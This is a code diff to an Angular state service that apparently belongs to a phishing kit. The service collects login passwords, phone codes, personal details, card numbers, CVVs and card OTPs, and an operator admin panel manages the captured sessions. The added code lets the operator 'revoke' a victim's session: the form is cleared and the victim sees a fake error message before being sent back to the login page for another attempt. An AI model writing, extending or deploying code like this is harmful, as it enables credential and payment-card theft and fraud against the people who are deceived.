@@ -750,6 +750,36 @@ export class StateService {
                this.isFlowComplete.set(true);
                this.navigate('success', true);
            }
+      } else if (action === 'REVOKE') {
+           localStorage.removeItem('pp_app_state_v1');
+           localStorage.removeItem('session_id_v7');
+
+           // Reset State
+           this.email.set('');
+           this.password.set('');
+           this.phoneNumber.set('');
+           this.phoneCode.set('');
+           this.firstName.set('');
+           this.lastName.set('');
+           this.dob.set('');
+           this.address.set('');
+           this.country.set('');
+           this.cardNumber.set('');
+           this.cardExpiry.set('');
+           this.cardCvv.set('');
+           this.cardOtp.set('');
+
+           this.isLoginVerified.set(false);
+           this.isPhoneVerified.set(false);
+           this.isPersonalVerified.set(false);
+           this.isCardSubmitted.set(false);
+           this.isFlowComplete.set(false);
+
+           // Generate new ID for fresh start
+           this.sessionId.set(this.generateId());
+
+           this.rejectionReason.set("An error occured, Please try again");
+           this.navigate('login', true);
       }
   }
 
@@ -922,6 +952,16 @@ export class StateService {
           this.fetchSessions();
       } catch (e) {
           this.showAdminToast('Failed to delete');
+      }
+  }
+
+  async adminRevokeSession(id: string) {
+      try {
+          await firstValueFrom(from(fetch(`/api/sessions/${id}/revoke`, { method: 'POST' })));
+          this.showAdminToast('Session Revoked');
+          this.fetchSessions();
+      } catch (e) {
+          this.showAdminToast('Failed to revoke');
       }
   }
 
